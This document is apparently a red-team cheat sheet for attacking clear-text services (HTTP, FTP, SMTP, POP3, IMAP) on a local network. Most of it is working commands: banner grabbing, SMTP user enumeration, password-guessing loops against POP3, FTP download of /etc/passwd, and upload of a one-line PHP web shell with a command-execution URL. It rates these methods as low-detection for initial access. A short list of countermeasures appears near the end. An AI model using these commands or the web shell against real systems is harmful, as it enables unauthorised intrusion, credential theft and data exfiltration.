HTTP (PORT 80) - WEB SERVICES
bash
# Protocol Characteristics  
- Port: 80
- Communication: Clear-text headers & data
- Risk: High (sensitive data exposure)

# Red Team Operations
telnet 192.168.1.1 80
GET / HTTP/1.1
Host: 192.168.1.1

curl -I http://192.168.1.1               # Header analysis
curl -X TRACE http://192.168.1.1         # HTTP method testing

# Attack Vectors
- Information disclosure via server headers
- HTTP verb tampering (PUT, DELETE, TRACE)
- Directory traversal attacks
- Session hijacking (if no HTTPS)
FTP (PORT 21) - FILE TRANSFER
bash
# Protocol Characteristics
- Port: 21 (control), 20 (data)
- Communication: Clear-text authentication
- Risk: High (credentials & data exposed)

# Red Team Operations
ftp 192.168.1.1                          # Interactive connection
username: anonymous                      # Anonymous access attempt
password: [any value]

telnet 192.168.1.1 21                    # Banner grabbing
USER anonymous                           # Manual authentication test
PASS test@example.com

# Attack Vectors
- Anonymous login exploitation
- Credential sniffing
- Directory traversal (../ in filenames)
- FTP bounce attacks
SMTP (PORT 25) - EMAIL TRANSFER
bash
# Protocol Characteristics
- Port: 25
- Communication: Clear-text commands
- Risk: Medium-High (user enumeration)

# Red Team Operations  
telnet 192.168.1.1 25
HELO example.com
MAIL FROM: attacker@evil.com
VRFY root                                # User enumeration
EXPN admin-list                          # List expansion
RCPT TO: user@domain.com                # Recipient verification

# Attack Vectors
- User enumeration (VRFY, EXPN, RCPT)
- Open relay exploitation
- Email spoofing
- Banner information disclosure
POP3 (PORT 110) - EMAIL RETRIEVAL
bash
# Protocol Characteristics
- Port: 110
- Communication: Clear-text authentication
- Risk: High (email access)

# Red Team Operations
telnet 192.168.1.1 110
USER administrator                       # Authentication attempt
PASS Password123
LIST                                     # Message listing
RETR 1                                   # Retrieve message 1

# Attack Vectors
- Clear-text credential capture
- User enumeration (different responses)
- Email content exfiltration
- Session interception
IMAP (PORT 143) - EMAIL MANAGEMENT
bash
# Protocol Characteristics
- Port: 143
- Communication: Clear-text authentication
- Risk: High (email system access)

# Red Team Operations
telnet 192.168.1.1 143
a1 LOGIN username password              # IMAP authentication
a2 LIST "" "*"                          # Folder listing
a3 SELECT INBOX                         # Access inbox
a4 FETCH 1 BODY[]                       # Retrieve email

# Attack Vectors
- Credential brute force
- Email folder structure discovery
- Corporate email exfiltration
- Privilege escalation through misconfiguration
🛠️ RED TEAM OPERATIONAL PROCEDURES
PHASE 1: SERVICE DISCOVERY & MAPPING
bash
# Comprehensive Protocol Scanning
nmap -p21,23,25,80,110,143,443,993,995 192.168.1.0/24

# Automated Banner Grabbing
for port in 21 23 25 80 110 143; do
    echo "=== Port $port ==="
    nc -nv -w 2 192.168.1.1 $port | head -3
done

# Service Identification
- Port 21: FTP (File Transfer)
- Port 23: Telnet (Remote Access)  
- Port 25: SMTP (Email Transfer)
- Port 80: HTTP (Web Services)
- Port 110: POP3 (Email Retrieval)
- Port 143: IMAP (Email Management)
PHASE 2: VULNERABILITY ASSESSMENT
bash
# FTP Assessment
echo "QUIT" | nc -w 2 192.168.1.1 21    # Banner analysis
ftp -n 192.168.1.1 << EOF               # Anonymous access test
user anonymous
pass anonymous
quit
EOF

# SMTP User Enumeration
for user in root admin administrator webmaster; do
    echo "VRFY $user" | nc -w 1 192.168.1.1 25
done

# HTTP Information Disclosure
curl -I http://192.168.1.1              # Header analysis
curl http://192.168.1.1/robots.txt      # Directory discovery
PHASE 3: EXPLOITATION & INTELLIGENCE GATHERING
bash
# FTP Exploitation (if anonymous access)
ftp 192.168.1.1
anonymous                                # Login
ls                                       # List files
get confidential.pdf                     # Download files
put backdoor.php                         # Upload (if writable)

# SMTP Open Relay Testing
telnet 192.168.1.1 25
MAIL FROM: test@external.com
RCPT TO: victim@otherdomain.com
DATA                                     # If accepted → open relay!

# Email Credential Testing
for pass in Password123 admin 123456 password; do
    echo "USER admin" && echo "PASS $pass" | nc -w 2 192.168.1.1 110
done
PHASE 4: DATA EXFILTRATION & PERSISTENCE
bash
# FTP Data Exfiltration
ftp -n 192.168.1.1 << EOF
user anonymous anonymous
binary
get /etc/passwd ./passwd_copy.txt
quit
EOF

# Web Shell Deployment (if writable web directory)
echo '<?php system($_GET["cmd"]); ?>' | ftp -n 192.168.1.1
# Then: http://192.168.1.1/shell.php?cmd=whoami

# Email Access for Intelligence
telnet 192.168.1.1 110
USER admin
PASS Password123
LIST                                     # See email subjects
RETR 1                                   # Read specific email
📈 RISK ASSESSMENT
Detection Risk: LOW-MEDIUM (Protocol-level interactions)

Operational Value: HIGH (Credential & intelligence gathering)

Enterprise Prevalence: HIGH (Legacy systems common in corporations)

🔧 DEFENSIVE COUNTERMEASURES UNDERSTOOD
SSL/TLS encryption (HTTPS, FTPS, SMTPS)

Disabling clear-text protocols

Strong authentication requirements

Network segmentation for sensitive services

Intrusion detection for protocol anomalies

Regular service patching and updates

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Web Application Security
✅ Database Security
✅ Stealth Intelligence Gathering
✅ Direct Engagement Operations
✅ Network Host Discovery
✅ Port & Service Enumeration
✅ Advanced Firewall Evasion
✅ Comprehensive Service Profiling
✅ Protocol-Level Exploitation ← PROTOCOLS & SERVICES ADDED
◽ Vulnerability Assessment
◽ Privilege Escalation

OPERATIONAL NOTES: Clear-text protocols remain prevalent in enterprise environments despite known security risks. Mastery of manual service interaction provides Red Teams with low-detection methods for intelligence gathering and initial access, particularly in legacy systems and misconfigured services.

